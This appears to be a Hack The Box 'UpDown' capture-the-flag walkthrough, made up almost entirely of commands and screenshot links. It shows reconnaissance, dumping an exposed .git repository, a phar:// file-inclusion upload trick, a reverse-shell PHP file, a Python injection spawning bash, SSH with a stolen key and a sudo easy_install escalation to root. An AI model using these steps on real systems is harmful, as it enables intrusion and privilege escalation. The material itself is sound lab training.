```
nmap -sS -sC -sV -T5 -Pn 10.10.11.177
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.177/FUZZ -fs 277 -e .aspx,.php,.txt,.html,.sh
gobuster dir -u 10.10.11.177 -w /usr/share/dirb/wordlists/common.txt
gobuster dir -u http://10.10.11.177/dev/ -w /usr/share/dirb/wordlists/common.txt
http://10.10.11.177/
http://10.10.11.177/dev/
http://10.10.11.177/dev/.git/
pip install git-dumper
git-dumper http://10.10.11.177/dev/.git /home/itsec/Documents/HTB-UpDown/dev/
git log
Proxy – Match and replace rules
http://dev.siteisup.htb/
echo "<?php phpinfo(); ?>" > info.php
zip info.zip info.php
mv info.zip info.txt
http://dev.siteisup.htb/uploads/
http://dev.siteisup.htb/?page=phar://uploads/81d6840826b9f6ab35021cfbc006b9be/info.txt/info
https://github.com/teambi0s/dfunc-bypasser
./dfunc-bypasser.py --url 'http://dev.siteisup.htb/?page=phar://uploads/e744af4911ee9e365e53bebef0ee2496/info.txt/info'
nano rev.php
zip rev.zip rev.php
mv rev.zip rev.txt
cd /home/developer/dev
./siteisup
__import__('os').system('/bin/bash')
cd .ssh
chmod 600 id_rsa
ssh -i id_rsa developer@10.10.11.177
sudo –l
https://gtfobins.github.io/gtfobins/easy_install/
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```



```
nmap -sS -sC -sV -T5 -Pn 10.10.11.177
nmap -p- -T5 10.10.11.177
nmap -sU -T5 10.10.11.177
```
![image](https://github.com/regarmulia/HTB/assets/33616880/15bb628f-5350-404b-b2d7-eafb2335761d)

![image](https://github.com/regarmulia/HTB/assets/33616880/5fae680f-c693-4297-8d4f-fad45d708e18)

![image](https://github.com/regarmulia/HTB/assets/33616880/9e42e535-c455-4d85-9a9d-a039eb16e54c)

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.177/FUZZ -fs 277 -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/077ed537-45e8-4ea9-a060-f12c713317de)

```
gobuster dir -u 10.10.11.177 -w /usr/share/dirb/wordlists/common.txt
gobuster dir -u http://10.10.11.177/dev/ -w /usr/share/dirb/wordlists/common.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/a61a87b5-2384-4c18-ae4a-8205a3a644e5)

```
http://10.10.11.177/
http://10.10.11.177/dev/
http://10.10.11.177/dev/.git/
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4d1ba772-886d-495b-95bd-41ee263f6786)

![image](https://github.com/regarmulia/HTB/assets/33616880/4027a9c2-5c52-457e-866a-f7cfee17108e)

![image](https://github.com/regarmulia/HTB/assets/33616880/535382da-97dd-4bc7-bc70-907ad859d45b)

```
pip install git-dumper
git-dumper http://10.10.11.177/dev/.git /home/itsec/Documents/HTB-UpDown/dev/
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4204b7d4-86e5-4e5a-947e-75a493b4fe48)

![image](https://github.com/regarmulia/HTB/assets/33616880/80273182-2492-48e9-b019-065cb1185564)

![image](https://github.com/regarmulia/HTB/assets/33616880/f0a4a58e-1c6b-4703-8daf-0ff81cfbad8c)

```
git log
```
![image](https://github.com/regarmulia/HTB/assets/33616880/7e72fada-0ecf-4f5e-81af-79687122e623)

![image](https://github.com/regarmulia/HTB/assets/33616880/a720577a-bbc2-45fe-a3f7-db57d1c5cbda)

```
Proxy – Match and replace rules
```
![image](https://github.com/regarmulia/HTB/assets/33616880/f976a607-593e-48e1-a9e3-6e52253ea074)

```
http://dev.siteisup.htb/
```
![image](https://github.com/regarmulia/HTB/assets/33616880/97dc16bf-d314-4448-887b-3590a4e5f338)

![image](https://github.com/regarmulia/HTB/assets/33616880/031e235e-781f-46ac-83e3-8b3c2ec7a69f)

![image](https://github.com/regarmulia/HTB/assets/33616880/0838e7c3-ae2c-42ce-a472-bfe74caf82ab)

```
echo "<?php phpinfo(); ?>" > info.php
zip info.zip info.php
mv info.zip info.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/652bec68-34c3-4bcb-b23b-cdd3072aff64)

```
http://dev.siteisup.htb/uploads/
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d4792383-cb0f-4616-add7-2c23d4b235ae)

![image](https://github.com/regarmulia/HTB/assets/33616880/da408073-3391-482f-ab16-ebc049727f47)

```
http://dev.siteisup.htb/?page=phar://uploads/81d6840826b9f6ab35021cfbc006b9be/info.txt/info
```
![image](https://github.com/regarmulia/HTB/assets/33616880/5f3e5e9c-7c23-49e2-88e4-462971c8f3db)

```
https://github.com/teambi0s/dfunc-bypasser
./dfunc-bypasser.py --url 'http://dev.siteisup.htb/?page=phar://uploads/e744af4911ee9e365e53bebef0ee2496/info.txt/info'
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d79e28d9-f6a5-457e-8072-707a93be3a57)

```
nano rev.php
zip rev.zip rev.php
mv rev.zip rev.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/fe3d33c7-2356-4a7b-bf40-3ef2f4d2b221)

![image](https://github.com/regarmulia/HTB/assets/33616880/a2144978-4e6c-499a-8fdf-9cf5fd9ecd1f)

![image](https://github.com/regarmulia/HTB/assets/33616880/4c062487-c2f0-4abc-b1cc-87a0f86936db)

```
cd /home/developer/dev
```
![image](https://github.com/regarmulia/HTB/assets/33616880/11e376a2-b3fd-4ad4-ab4d-1d3531773f26)

```
./siteisup
__import__('os').system('/bin/bash')
```
![image](https://github.com/regarmulia/HTB/assets/33616880/20f8a856-a577-4e6a-aa76-e4b3b771b94c)

```
cd .ssh
chmod 600 id_rsa
ssh -i id_rsa developer@10.10.11.177
```
![image](https://github.com/regarmulia/HTB/assets/33616880/35331faa-74b7-4450-b2db-63f77f1f9eab)

![image](https://github.com/regarmulia/HTB/assets/33616880/e668dfc6-5860-4451-9e77-3b599197e3db)

![image](https://github.com/regarmulia/HTB/assets/33616880/229d6715-841c-4ec2-9749-1a94b1b39e59)

![image](https://github.com/regarmulia/HTB/assets/33616880/f4a34c73-95a0-4f58-bb6e-5700695b4876)

```
sudo –l
https://gtfobins.github.io/gtfobins/easy_install/
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```
![image](https://github.com/regarmulia/HTB/assets/33616880/5a777a1d-ea59-4905-8cb4-e0b6c4947f8e)

![image](https://github.com/regarmulia/HTB/assets/33616880/5c5df04a-4057-40b9-b532-5d2eae8accad)
